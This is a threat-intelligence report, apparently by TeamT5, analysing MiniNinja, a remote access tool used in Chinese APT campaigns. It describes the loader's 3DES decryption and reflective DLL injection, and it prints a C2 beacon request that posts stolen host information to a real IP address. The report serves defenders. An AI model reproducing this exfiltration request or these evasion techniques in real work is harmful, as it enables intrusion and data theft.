TeamT5 discovered a new remote administration tool (RAT), which we dubbed as MiniNinja,
being used in several Chinese APT campaigns. TeamT5 has observed countries across
different APAC regions, including Taiwan, Russia, Kyrgyzstan, Uzbekistan, Vietnam, the
Philippines, and Pakistan, being targeted and attacked by this malware. The impacted
industries include governments, energy, IT, telecommunication and engineering. MiniNinja is
a complex malware that uses several advanced techniques to prevent itself from being
detected and analyzed. Further, its wide targeting scope also attracted our attention. In this
report, we will introduce the technical detail of our analysis.
MiniNinja was first discovered in the wild in a targeted attack against Taiwanese government
agencies in early March 2021. The actor leveraged the ProxyLogon vulnerability (CVE-202126855) to compromise an email server and further implanted CobaltStrike Beacon and
MiniNinja RAT in the victim network environment. This information was also disclosed in an
ESET report[1] about a "Websiic Campaign" using the ProxyLogon vulnerability. TeamT5
noticed the existence of this new malware and started tracking its activities. Since then,
TeamT5 has observed its footprints in Vietnam[2], Pakistan and the Philippines, possibly also
implanted in victim hosts via the ProxyLogon vulnerability. Its latest activities were spear
1/8

phishing email attacks against Russia and Uzbekistan in September 2021. TeamT5 is still
uncertain of the attribution of these attacks. However, we possess high confidence that this is
a new tool used by Chinese APT based on its TTPs and C2 infrastructure.
To bypass antivirus detection, MiniNinja is encrypted as a binary blob in a binary payload file.
It might have one to multiple loader components in native PE or .Net, but basically the
loaders do similar tasks. The loader components will decrypt and run it in memory via
reflective DLL injection techniques. Its loader firstly checks the first 4 bytes of the payload file
and decrypts the content by using 3DES (112bit) algorithm in case of header check passes:

The decrypted buffer might be passed to a second stage loader for further processing if there
are multiple loader components. The loader will then decode the content by custom decoding
methods and LZSS decompression algorithm. The decoded payload is a PE file with its PE
header erased and it is just the MiniNinja RAT. Finally, the loader will locate its export
function "Debug" and start execution from there:

In a payload collected from some Taiwanese victims, there is a PDB string left by the
developer (only in memory) and thus we name this malware MiniNinja:

The decrypted malware configuration block contains Mutex string, C2 URL, HTTP Header
information, sleep time, etc.:

Upon execution, the following victim host information will be collected:
System info
OS version
Hostname
4/8

IP addr
Process name
Process ID
The above data would be encoded with XOR encode and custom base64 encode. Finally,
the encoded result would be sent to its C2 via POST:
POST http://149.28.28.159:443/Collector/3.0/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
